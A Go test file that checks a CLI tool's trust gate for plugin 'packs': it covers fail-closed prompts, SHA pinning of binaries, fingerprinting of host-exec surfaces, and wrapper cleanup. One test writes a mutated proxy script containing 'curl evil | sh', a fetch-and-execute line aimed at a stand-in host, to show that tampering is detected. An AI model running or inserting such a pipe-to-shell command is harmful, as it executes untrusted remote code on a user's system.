// pack_v2_phase2_test.go — packs-v2 Phase 2: F3 host-mode wrappers + F5 Tier-1
// trust gate (docs/design/packs-v2-impl.md; trust model packs.md §9).
//
// Fitness functions covered here:
//   - host wrapper on PATH for host mode only (hostChildEnv; the sandbox kit
//     exclusion is pinned by TestSynthesizePackKit_SandboxOnly)
//   - [[bin]] sha mismatch refuses at install AND at launch AND at activation
//   - Tier-1 adopt prompts; non-TTY fails closed without --yes; Tier-0 silent
//   - host-wrapper swap on pack switch (old cleared)
//   - BoM enumerates every host-exec facet + egress + credential names
package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"pi-stack/host/config"
)

// sha256Hex is the test-side hash of raw bytes (for authoring valid pins).
func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// acceptPackSurface records pack root's CURRENT host-exec surface as accepted
// in the HOST trust store — the test-side stand-in for saying yes at the
// Tier-1 gate. PI_STACK_CONFIG must already point into a temp dir.
func acceptPackSurface(t *testing.T, root, cfgGogAccount string) {
	t.Helper()
	p, err := loadPack(root)
	if err != nil {
		t.Fatal(err)
	}
	fp, _, err := computeHostExecFingerprint(root, computeHostBoM(p, cfgGogAccount))
	if err != nil {
		t.Fatal(err)
	}
	store, err := loadPackTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	store.recordAcceptance(store.trustKey(root), packTrustRecord{Path: canonicalizePackRoot(root), Fingerprint: fp})
	if err := store.save(); err != nil {
		t.Fatal(err)
	}
}

// --- F5: computeHostBoM ---------------------------------------------------------

// TestComputeHostBoM_EnumeratesEveryHostExecFacet: the BoM lists every MCP (with
// the resolved serverCmd argv), every host wrapper, every [[bin]] (path+sha),
// the egress union across ALL proxies (sandbox egress informs the screen even
// though it never raises the tier), and credential VAR names — never values.
func TestComputeHostBoM_EnumeratesEveryHostExecFacet(t *testing.T) {
	p := &packInfo{Root: "/p", Manifest: packManifest{
		Name: "work",
		Integrations: []packIntegration{
			{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"},
			{Name: "Gog", MCP: "gog", Env: "GOG_KEYRING"},
		},
		Proxies: []packProxy{
			{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}},
			{Name: "snowflake", Egress: []string{"snowflakecomputing.com"}},
		},
		Bins: []packBin{{Name: "fastmail-mcp", Path: "bin/fastmail-mcp", SHA: "9F2C", Host: true}},
	}}
	b := computeHostBoM(p, "")
	if !b.tier1() {
		t.Fatal("a pack with mcp + host proxy + bin must be Tier-1")
	}
	if len(b.MCP) != 2 || b.MCP[0].Name != "fastmail" || b.MCP[1].Name != "gog" {
		t.Errorf("BoM mcp = %+v", b.MCP)
	}
	if got := strings.Join(b.MCP[0].Argv, " "); got != "pi-stack-host mcp fastmail" {
		t.Errorf("fastmail argv = %q (must be the real serverCmd shape)", got)
	}
	if got := strings.Join(b.MCP[1].Argv, " "); !strings.Contains(got, "--gmail-no-send") || !strings.Contains(got, "--readonly") {
		t.Errorf("gog argv must carry the hardened flags, got %q", got)
	}
	if len(b.Proxies) != 1 || b.Proxies[0] != "platformio" {
		t.Errorf("BoM host proxies = %v (sandbox proxies never appear)", b.Proxies)
	}
	if len(b.Bins) != 1 || b.Bins[0].Name != "fastmail-mcp" {
		t.Errorf("BoM bins = %+v", b.Bins)
	}
	wantEgress := []string{"api.registry.platformio.org", "snowflakecomputing.com"}
	if strings.Join(b.Egress, ",") != strings.Join(wantEgress, ",") {
		t.Errorf("BoM egress = %v, want the sorted union %v", b.Egress, wantEgress)
	}
	if strings.Join(b.Creds, ",") != "FASTMAIL_TOKEN,GOG_KEYRING" {
		t.Errorf("BoM creds = %v (VAR names only)", b.Creds)
	}
}

// TestComputeHostBoM_Tier0: skills/knowledge/sandbox-proxy-only packs have no
// host-exec facet — egress and creds alone never raise the tier.
func TestComputeHostBoM_Tier0(t *testing.T) {
	p := &packInfo{Root: "/p", Manifest: packManifest{
		Name:         "personal",
		Proxies:      []packProxy{{Name: "snowflake", Egress: []string{"snowflakecomputing.com"}}},
		Integrations: []packIntegration{{Name: "ref-only", Env: "SOME_TOKEN"}}, // env but NO mcp
	}}
	if b := computeHostBoM(p, ""); b.tier1() {
		t.Errorf("no mcp, no host proxy, no bin must be Tier-0, got %+v", b)
	}
}

// --- F5: the gate itself ----------------------------------------------------------

func TestPackTrustGate_FailClosedMatrix(t *testing.T) {
	bom := hostBoM{Proxies: []string{"platformio"}}
	cases := []struct {
		name   string
		tty    bool
		yes    bool
		answer string
		wantOK bool
	}{
		{"non-tty without --yes fails closed", false, false, "", false},
		{"non-tty with --yes accepts", false, true, "", true},
		{"tty yes accepts", true, false, "y\n", true},
		{"tty YES accepts", true, false, "YES\n", true},
		{"tty empty answer defaults to No", true, false, "\n", false},
		{"tty n refuses", true, false, "n\n", false},
		{"tty EOF refuses", true, false, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var out bytes.Buffer
			err := packTrustGate(strings.NewReader(c.answer), &out, c.tty, c.yes, "work", bom)
			if (err == nil) != c.wantOK {
				t.Errorf("gate(tty=%v yes=%v answer=%q) err=%v, wantOK=%v", c.tty, c.yes, c.answer, err, c.wantOK)
			}
			if !strings.Contains(out.String(), "platformio") {
				t.Errorf("the BoM screen must name every host wrapper, got:\n%s", out.String())
			}
		})
	}
}

// TestHostExecFingerprint: the acceptance fingerprint covers the FULL host-exec
// surface — identical surface → identical fingerprint (no re-prompt on
// re-activation), while ANY change (a new mcp, a changed gog account resolved
// into the argv, a mutated host proxy SCRIPT, a changed [[bin]] sha) produces
// a different fingerprint and re-triggers the gate. Name-only coverage (the
// old lock model's flaw) is structurally impossible here.
func TestHostExecFingerprint(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\necho ok\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	base := packManifest{
		Name:         "work",
		Integrations: []packIntegration{{Name: "Gog", MCP: "gog", Env: "GOG_KEYRING"}},
		Proxies:      []packProxy{{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}}},
		Bins:         []packBin{{Name: "fm", Path: "bin/fm", SHA: "aaaa", Host: true}},
	}
	fpOf := func(account string, m packManifest) string {
		t.Helper()
		fp, _, err := computeHostExecFingerprint(root, computeHostBoM(&packInfo{Root: root, Manifest: m}, account))
		if err != nil {
			t.Fatalf("fingerprint: %v", err)
		}
		return fp
	}
	fp0 := fpOf("a@example.com", base)
	if fpOf("a@example.com", base) != fp0 {
		t.Error("identical surface must produce an identical fingerprint (no re-prompt)")
	}
	if fpOf("b@example.com", base) == fp0 {
		t.Error("a changed gog account (→ changed resolved MCP argv) must change the fingerprint")
	}
	m := base
	m.Bins = []packBin{{Name: "fm", Path: "bin/fm", SHA: "bbbb", Host: true}}
	if fpOf("a@example.com", m) == fp0 {
		t.Error("a CHANGED [[bin]] sha must change the fingerprint")
	}
	m = base
	m.Integrations = append([]packIntegration{{Name: "New", MCP: "new-mcp"}}, base.Integrations...)
	if fpOf("a@example.com", m) == fp0 {
		t.Error("a NEW mcp must change the fingerprint")
	}
	// Mutate the host proxy script: the CONTENT is pinned, not just the name.
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if fpOf("a@example.com", base) == fp0 {
		t.Error("a MUTATED host proxy script must change the fingerprint")
	}
	// A missing/unreadable script fails closed (nothing to accept or install).
	if err := os.Remove(filepath.Join(root, "bin", "platformio")); err != nil {
		t.Fatal(err)
	}
	if _, _, err := computeHostExecFingerprint(root, computeHostBoM(&packInfo{Root: root, Manifest: base}, "")); err == nil {
		t.Error("a missing host proxy script must fail the fingerprint (fail closed)")
	}
}

// --- F5: end-to-end through runPackUse -------------------------------------------

// TestPackUse_Tier1NonTTYFailsClosed (fitness #5): a Tier-1 `pack use` on a
// non-TTY without --yes exits non-zero and registers NOTHING — no config
// commit, no acceptance recorded. Subprocess because runPackUse os.Exits.
func TestPackUse_Tier1NonTTYFailsClosed(t *testing.T) {
	if os.Getenv("PI_STACK_TEST_PHASE2") == "tier1-nontty" {
		runPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PI_STACK_TEST_PACK_ROOT")})
		return // exit 0 == the gate did NOT fail closed
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Integrations: []packIntegration{{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"}}})

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_Tier1NonTTYFailsClosed$")
	// A pipe stdin (NOT the inherited /dev/null, which Stat()s as a char
	// device) so the child's isTTY is deterministically false — the exact
	// CI/script shape the fail-closed contract is about.
	cmd.Stdin = strings.NewReader("")
	cmd.Env = append(os.Environ(),
		"PI_STACK_TEST_PHASE2=tier1-nontty",
		"PI_STACK_TEST_PACK_ROOT="+root,
		"PI_STACK_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("Tier-1 non-TTY adopt without --yes must exit non-zero; output:\n%s", out)
	}
	if !strings.Contains(string(out), "--yes") {
		t.Errorf("the refusal must point at --yes, got:\n%s", out)
	}
	if !strings.Contains(string(out), "fastmail") {
		t.Errorf("the BoM screen must have printed the mcp, got:\n%s", out)
	}
	if _, serr := os.Stat(cfgPath); !os.IsNotExist(serr) {
		b, _ := os.ReadFile(cfgPath)
		t.Errorf("nothing may commit on refusal; config exists:\n%s", b)
	}
	if l := readPackLock(root); len(l.MCP) != 0 {
		t.Errorf("no attribution may be recorded on refusal, lock=%+v", l)
	}
	if _, serr := os.Stat(filepath.Join(dir, packTrustStoreName)); !os.IsNotExist(serr) {
		b, _ := os.ReadFile(filepath.Join(dir, packTrustStoreName))
		t.Errorf("no acceptance may be recorded on refusal; trust store exists:\n%s", b)
	}
}

// TestPackUse_Tier0StillSilent (fitness #5, other half): a Tier-0 pack adopts
// with NO prompt and NO BoM screen — unchanged Phase-1 behavior, in-process
// (a misfiring gate would os.Exit(1) and fail the whole test binary).
func TestPackUse_Tier0StillSilent(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, packManifest{Name: "personal", Schema: 1,
		Proxies: []packProxy{{Name: "snowflake"}}}) // sandbox-only proxy: Tier-0
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "snowflake"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	runPackUse(fakeGitEnv(nil), &out, []string{root}) // NO --yes, no TTY: must succeed
	if strings.Contains(out.String(), "[y/N]") || strings.Contains(out.String(), "runs code on your host") {
		t.Errorf("Tier-0 must adopt silently, got:\n%s", out.String())
	}
	cfg, _ := config.Load()
	if cfg.Pack != root {
		t.Errorf("Tier-0 pack did not activate, cfg.Pack=%q", cfg.Pack)
	}
}

// TestPackUse_AcceptanceSticksAcrossReactivation: after a --yes adoption the
// acceptance is recorded in the HOST trust store (never in the pack payload),
// so re-activating the SAME pack without --yes on a non-TTY succeeds (trust
// granted at adoption, no re-prompt).
func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Integrations: []packIntegration{{Name: "Fastmail", MCP: "fastmail"}}})

	var out bytes.Buffer
	runPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"})
	store, serr := loadPackTrustStore()
	if serr != nil {
		t.Fatal(serr)
	}
	if _, ok := store.acceptedFingerprint(store.trustKey(root)); !ok {
		t.Fatalf("acceptance not recorded in the host trust store: %+v", store)
	}
	// And NOTHING security-relevant landed inside the pack payload.
	if b, _ := os.ReadFile(packLockPath(root)); strings.Contains(strings.ToLower(string(b)), "accepted") {
		t.Errorf("acceptance must never live inside the pack (pack.lock):\n%s", b)
	}
	// Reactivation without --yes on a non-TTY: a misfiring gate would
	// os.Exit(1) here and fail the whole test binary.
	out.Reset()
	runPackUse(fakeGitEnv(nil), &out, []string{root})
	if strings.Contains(out.String(), "runs code on your host") {
		t.Errorf("covered BoM must not re-render the gate screen:\n%s", out.String())
	}
}

// TestPackUse_NewHostFacetRetriggersGate: a host-exec facet ADDED after
// adoption is not covered by the old acceptance — the next `pack use` fails
// closed again on a non-TTY. Subprocess (runPackUse os.Exits on refusal).
func TestPackUse_NewHostFacetRetriggersGate(t *testing.T) {
	if os.Getenv("PI_STACK_TEST_PHASE2") == "regate" {
		runPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PI_STACK_TEST_PACK_ROOT")})
		return
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	t.Setenv("PI_STACK_CONFIG", cfgPath)
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "pack")
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Integrations: []packIntegration{{Name: "Fastmail", MCP: "fastmail"}}})
	var out bytes.Buffer
	runPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}) // adopt + accept

	// The manifest gains a host wrapper AFTER adoption.
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Integrations: []packIntegration{{Name: "Fastmail", MCP: "fastmail"}},
		Proxies:      []packProxy{{Name: "platformio", Host: true}}})
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_NewHostFacetRetriggersGate$")
	cmd.Stdin = strings.NewReader("") // pipe stdin: deterministically non-TTY
	cmd.Env = append(os.Environ(),
		"PI_STACK_TEST_PHASE2=regate",
		"PI_STACK_TEST_PACK_ROOT="+root,
		"PI_STACK_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	cmdOut, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("a NEW host facet must re-trigger the gate (fail closed non-TTY); output:\n%s", cmdOut)
	}
	if !strings.Contains(string(cmdOut), "platformio") {
		t.Errorf("the re-fired BoM must name the new wrapper, got:\n%s", cmdOut)
	}
}

// TestPackUse_BinShaMismatchRefusesActivation (fitness #4, install half): a
// [[bin]] whose file does not hash to its pinned sha refuses `pack use`
// OUTRIGHT — even with --yes, before anything commits.
func TestPackUse_BinShaMismatchRefusesActivation(t *testing.T) {
	if os.Getenv("PI_STACK_TEST_PHASE2") == "binsha" {
		runPackUse(fakeGitEnv(nil), os.Stdout, []string{os.Getenv("PI_STACK_TEST_PACK_ROOT"), "--yes"})
		return
	}
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	root := filepath.Join(dir, "pack")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), []byte("tampered"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1,
		Bins: []packBin{{Name: "fm", Path: "bin/fm", SHA: sha256Hex([]byte("the pinned bytes")), Host: true}}})

	cmd := exec.Command(os.Args[0], "-test.run", "^TestPackUse_BinShaMismatchRefusesActivation$")
	cmd.Env = append(os.Environ(),
		"PI_STACK_TEST_PHASE2=binsha",
		"PI_STACK_TEST_PACK_ROOT="+root,
		"PI_STACK_CONFIG="+cfgPath,
		"XDG_STATE_HOME="+filepath.Join(dir, "state"),
	)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("a sha-mismatched [[bin]] must refuse activation; output:\n%s", out)
	}
	if !strings.Contains(string(out), "mismatch") {
		t.Errorf("expected a mismatch refusal, got:\n%s", out)
	}
	if _, serr := os.Stat(cfgPath); !os.IsNotExist(serr) {
		t.Error("nothing may commit when the pinned binary is tampered")
	}
}

// --- F3: host wrapper install / clear / refresh -----------------------------------

// phase2HostPack writes a pack with one host proxy wrapper (script) and returns
// its root. XDG_STATE_HOME must already be pointed at a temp dir by the caller.
func phase2HostPack(t *testing.T, dir, name, wrapper string) string {
	t.Helper()
	root := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bin", wrapper), []byte("#!/bin/sh\necho "+wrapper+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWritePack(t, root, packManifest{Name: name, Schema: 1,
		Proxies: []packProxy{{Name: wrapper, Host: true}}})
	return root
}

// TestRefreshHostPackWrappers_UnacceptedSurfaceInstallsNothing: acceptance is
// fingerprint-level and all-or-nothing — with no recorded acceptance in the
// HOST trust store, refresh installs NOTHING (with a pointer at `pack use`)
// and a strict (launch) refresh refuses outright. Nothing a pack ships (e.g.
// a forged pack.lock) can change that: the lock is not consulted at all.
func TestRefreshHostPackWrappers_UnacceptedSurfaceInstallsNothing(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := phase2HostPack(t, dir, "work", "platformio")
	// A forged, pack-supplied pack.lock using the OLD acceptance schema must
	// buy the attacker nothing.
	if err := os.WriteFile(packLockPath(root), []byte("accepted_host_proxies = [\"platformio\"]\nhost_wrappers = [\"platformio\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Pack: root}

	var out bytes.Buffer
	if _, err := refreshHostPackWrappers(&out, cfg, false); err != nil {
		t.Fatalf("lenient refresh must not hard-fail: %v", err)
	}
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "platformio")); err == nil {
		t.Error("an unaccepted host wrapper must NOT be installed")
	}
	if !strings.Contains(out.String(), "not accepted") {
		t.Errorf("the skip must be surfaced, got:\n%s", out.String())
	}
	// Strict (launch) fails closed on the same unaccepted surface.
	if _, err := refreshHostPackWrappers(&out, cfg, true); err == nil {
		t.Error("strict refresh of an unaccepted host-exec surface must refuse the launch")
	}
}

// TestInstallHostPackWrappers_BinShaMismatchRefusesAtInstall (fitness #4): an
// ACCEPTED [[bin]] whose file was swapped after acceptance re-hashes at install
// and is REFUSED — the tampered binary never lands in the host bin dir.
func TestInstallHostPackWrappers_BinShaMismatchRefusesAtInstall(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "work")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	pinned := []byte("the real binary")
	sha := sha256Hex(pinned)
	bin := packBin{Name: "fm", Path: "bin/fm", SHA: sha, Host: true}
	// The file on disk is NOT what was pinned/accepted.
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), []byte("swapped"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &packInfo{Root: root, Manifest: packManifest{Name: "work", Bins: []packBin{bin}}}

	installed, err := installHostPackWrappersStaged(p, nil)
	if err == nil || !strings.Contains(err.Error(), "mismatch") {
		t.Fatalf("a mismatched bin must refuse the staged install, got (%v, %v)", installed, err)
	}
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "fm")); err == nil {
		t.Error("the tampered binary must not exist in the host bin dir")
	}

	// And with the REAL pinned bytes it installs fine (the sha path works).
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), pinned, 0o755); err != nil {
		t.Fatal(err)
	}
	installed, err = installHostPackWrappersStaged(p, nil)
	if err != nil || len(installed) != 1 {
		t.Fatalf("the matching bin must install, got (%v, %v)", installed, err)
	}
	fi, err := os.Stat(filepath.Join(hostPackBinDir(), "fm"))
	if err != nil {
		t.Fatalf("verified bin not installed: %v", err)
	}
	if fi.Mode().Perm() != 0o755 {
		t.Errorf("wrapper mode = %v, want 0755", fi.Mode().Perm())
	}
}

// TestRefreshHostPackWrappers_LaunchRefusesOnShaMismatch (fitness #4, launch
// half): the strict (launch) refresh re-hashes every ACCEPTED [[bin]] and
// returns an error on mismatch — runHostLaunch turns that into a refusal. The
// lenient (setup) mode reports but does not error.
func TestRefreshHostPackWrappers_LaunchRefusesOnShaMismatch(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	root := filepath.Join(dir, "work")
	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	sha := sha256Hex([]byte("pinned"))
	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), []byte("tampered"), 0o755); err != nil {
		t.Fatal(err)
	}
	bin := packBin{Name: "fm", Path: "bin/fm", SHA: sha, Host: true}
	mustWritePack(t, root, packManifest{Name: "work", Schema: 1, Bins: []packBin{bin}})
	// Acceptance is recorded in the HOST trust store (the fingerprint pins the
	// DECLARED sha; the file's actual bytes are re-verified at install/launch).
	acceptPackSurface(t, root, "")
	cfg := &config.Config{Pack: root}

	var out bytes.Buffer
	if _, err := refreshHostPackWrappers(&out, cfg, true); err == nil || !strings.Contains(err.Error(), "mismatch") {
		t.Errorf("strict refresh must refuse a tampered accepted bin, got err=%v", err)
	}
	// Lenient (setup): no hard error; the bin is refused per-item instead.
	out.Reset()
	if _, err := refreshHostPackWrappers(&out, cfg, false); err != nil {
		t.Errorf("lenient refresh must not hard-fail: %v", err)
	}
	if !strings.Contains(out.String(), "mismatch") {
		t.Errorf("lenient refresh must still surface the refusal:\n%s", out.String())
	}
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "fm")); err == nil {
		t.Error("the tampered binary must never be installed")
	}
}

// TestPackUse_HostWrapperSwapOnSwitch (fitness: swap): `pack use A` installs
// A's accepted wrapper; `pack use B` clears A's and installs B's — the host
// bin dir only ever holds the ACTIVE pack's wrappers.
func TestPackUse_HostWrapperSwapOnSwitch(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	rootA := phase2HostPack(t, dir, "a", "a-tool")
	rootB := phase2HostPack(t, dir, "b", "b-tool")

	var out bytes.Buffer
	runPackUse(fakeGitEnv(nil), &out, []string{rootA, "--yes"})
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "a-tool")); err != nil {
		t.Fatalf("pack use A must install a-tool: %v\noutput:\n%s", err, out.String())
	}
	if store, serr := loadPackTrustStore(); serr != nil || store.Installed == nil || !containsStr(store.Installed.Wrappers, "a-tool") {
		t.Errorf("HOST state must attribute the installed wrapper (store=%+v, err=%v)", store, serr)
	}

	out.Reset()
	runPackUse(fakeGitEnv(nil), &out, []string{rootB, "--yes"})
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "b-tool")); err != nil {
		t.Fatalf("pack use B must install b-tool: %v", err)
	}
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "a-tool")); err == nil {
		t.Error("switching packs must clear the previous pack's host wrappers")
	}

	// And `pack rm` clears the active pack's wrappers too.
	out.Reset()
	runPackRm(&out, nil)
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "b-tool")); err == nil {
		t.Error("pack rm must remove the detached pack's host wrappers")
	}
}

// TestRefreshHostPackWrappers_Tier0AndMissingPackNoOp: no active pack, an
// absent pack dir, and a Tier-0 pack are all clean no-ops (no error, nothing
// installed) — the runHostSetup/runHostLaunch wiring must never trip on them.
func TestRefreshHostPackWrappers_Tier0AndMissingPackNoOp(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	var out bytes.Buffer
	if p, err := refreshHostPackWrappers(&out, &config.Config{}, true); err != nil || p != nil {
		t.Errorf("no active pack: want (nil,nil), got (%v,%v)", p, err)
	}
	if p, err := refreshHostPackWrappers(&out, &config.Config{Pack: filepath.Join(dir, "gone")}, true); err != nil || p != nil {
		t.Errorf("absent pack must degrade (errNotAPack), got (%v,%v)", p, err)
	}
	root := filepath.Join(dir, "tier0")
	mustWritePack(t, root, packManifest{Name: "tier0", Schema: 1})
	p, err := refreshHostPackWrappers(&out, &config.Config{Pack: root}, true)
	if err != nil || p == nil {
		t.Errorf("Tier-0 pack: want the loaded pack and no error, got (%v,%v)", p, err)
	}
	if entries, _ := os.ReadDir(hostPackBinDir()); len(entries) != 0 {
		t.Errorf("nothing may be installed for a Tier-0 pack, found %v", entries)
	}
}

// TestHostPackBinDir_OnHostPathOnly (fitness #1): hostChildEnv prepends the
// pack host-bin dir to PATH for the `pi-stack host` child ONLY. The sandbox
// side is pinned separately: TestSynthesizePackKit_SandboxOnly proves a
// host=true wrapper never enters the sandbox kit, and nothing in
// buildSbxArgs/applyPackToLaunch references hostPackBinDir.
func TestHostPackBinDir_OnHostPathOnly(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	env := hostChildEnv("/sa", "")
	wantPrefix := "PATH=" + hostPackBinDir() + string(os.PathListSeparator)
	found := false
	for _, kv := range env {
		if strings.HasPrefix(kv, wantPrefix) {
			found = true
		}
	}
	if !found {
		t.Errorf("hostChildEnv must prepend %s to PATH, got %v", hostPackBinDir(), env)
	}
	// The sandbox launch path must not touch the host bin dir at all: applying
	// a pack with a HOST wrapper to a sandbox launch installs nothing there.
	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
	root := phase2HostPack(t, dir, "work", "platformio")
	cfg := &config.Config{Pack: root}
	o := runOpts{}
	if _, err := applyPackToLaunch(cfg, &o, fakeGitEnv(nil)); err != nil {
		t.Fatalf("applyPackToLaunch: %v", err)
	}
	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "platformio")); err == nil {
		t.Error("a sandbox launch must never install host wrappers")
	}
	if len(o.PackKits) != 0 {
		t.Errorf("a host-only pack must synthesize no sandbox kit, got %v", o.PackKits)
	}
}

// TestVerifyPackBinSHA_Contract: empty sha, missing file, mismatch all refuse;
// a correct (case-insensitive) sha passes — mirroring verifyPluginSHA.
func TestVerifyPackBinSHA_Contract(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	data := []byte("binary bytes")
	if err := os.WriteFile(filepath.Join(dir, "bin", "fm"), data, 0o755); err != nil {
		t.Fatal(err)
	}
	sha := sha256Hex(data)
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm"}); err == nil || !strings.Contains(err.Error(), "SHA-pinned") {
		t.Errorf("empty sha must refuse as unpinned, got %v", err)
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm", SHA: "0000dead"}); err == nil || !strings.Contains(err.Error(), "mismatch") {
		t.Errorf("wrong sha must refuse with a mismatch, got %v", err)
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "gone", Path: "bin/gone", SHA: sha}); err == nil {
		t.Error("a missing file must refuse (cannot verify)")
	}
	if err := verifyPackBinSHA(dir, packBin{Name: "fm", Path: "bin/fm", SHA: strings.ToUpper(sha)}); err != nil {
		t.Errorf("correct (uppercase) sha must pass, got %v", err)
	}
}
